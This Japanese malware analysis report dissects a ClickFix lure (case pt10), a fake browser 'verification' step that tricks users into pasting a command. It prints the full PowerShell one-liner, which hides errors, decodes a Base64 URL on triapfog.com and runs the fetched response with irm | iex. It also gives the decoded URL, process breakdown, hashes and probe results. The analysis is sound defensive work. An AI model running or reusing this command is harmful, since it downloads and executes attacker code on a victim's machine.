# ClickFix command解析: pt10

## 概要

`clickfix-command.txt`で収集済みのpt10を、実行せずに文字列・process・後段取得境界へ分解した結果です。
ClickFixはmalware familyではなく、利用者にcommandを貼り付けさせる初期アクセス手法として扱います。

- case ID: `20260825-command-pt10`
- stage domain: `triapfog.com`
- command SHA-256: `1a44a4d00493aca1e833ed54f60d07141c42c196b81951fe31a6a3bc69842da8`
- source file SHA-256: `8326ca91fcb530acaebfa6a42ea240fdfc6321e73090043cc60f63bd4d8296b0`
- 重複数: `1`
- command実行: `false`
- payload実行: `false`

## 実command line

```powershell
<# Security verification #> <# Completes the browser challenge for this device. #> <# Ticket 9D9527B1E4AE | BC7ED72F-6EC5 #> $ErrorActionPreference='SilentlyContinue';$ProgressPreference='SilentlyContinue';try{$Host.UI.RawUI.WindowTitle='Verification'}catch{};try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{};Write-Host 'Completing verification...' -ForegroundColor DarkYellow;function Confirm-SecuritySession { <# bind one-time session ticket #> $u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly90cmlhcGZvZy5jb20vc2VjdXJpdHkvYzhwcHdveWU1MA==')); irm $u | iex };Confirm-SecuritySession
```

## 復号結果

```text
https://triapfog.com/security/c8ppwoye50
```

## 悪性process挙動

```text
既存powershell.exeへ貼り付け → Confirm-SecuritySession関数 → Base64 URL復号 → 同一powershell.exe内でHTTP応答をIEX評価
```

- fake browser challengeのコメントとticket文字列で正規verificationを装う。
- ErrorActionPreferenceとProgressPreferenceをSilentlyContinueへ変更し、エラーと進捗を隠す。
- window titleをVerificationへ変更し、TLS 1.2を強制する。
- Base64値は https://triapfog.com/security/c8ppwoye50 に復号される。
- Confirm-SecuritySession関数を定義後すぐ呼び、irm応答をiexで同一process内評価する。

## 最終取得状態

- analyst probe: `https://triapfog.com/security/c8ppwoye50`
- 結果: `HTTP 403、5105 bytes、body SHA-256 1fc2b8f022b09b4076ef09e7fc4b3e6f702b5ee877837304ccd9eff30d028775`
- 後段script／payload復元: `false`

現在の限定GETでは実行可能な後段本文を復元できませんでした。したがって、確実に言える最終ローカル動作は「HTTP応答をPowerShellとしてメモリ内評価する」境界までです。後段が生成する追加process、永続化、最終malware familyは未確認であり、推測で補っていません。

analyst probeは原文または静的復号で得たURLへGETだけを行いました。probe結果を実行時証跡とは扱いません。

## 関連成果物

- [processとcommand詳細](OVERALL-LOGIC.md)
- [感染チェーン](INFECTION-CHAIN.md)
- [特徴](FEATURES.md)
- [IOC](IOC-LIST.md)
- [構造化解析](analysis.json)
